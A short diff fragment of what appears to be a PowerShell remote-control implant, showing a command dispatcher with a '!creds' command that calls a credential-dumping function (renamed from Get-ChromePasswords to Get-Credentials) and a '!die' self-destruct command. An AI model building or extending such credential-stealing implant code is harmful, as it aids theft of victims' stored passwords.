@@ -224,7 +224,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                        $response = Get-ChromePasswords
+                        $response = Get-Credentials
                     }
                     elseif ($cmd -eq "!die") {
                         $response = "[!] Self-destruct initiated..."
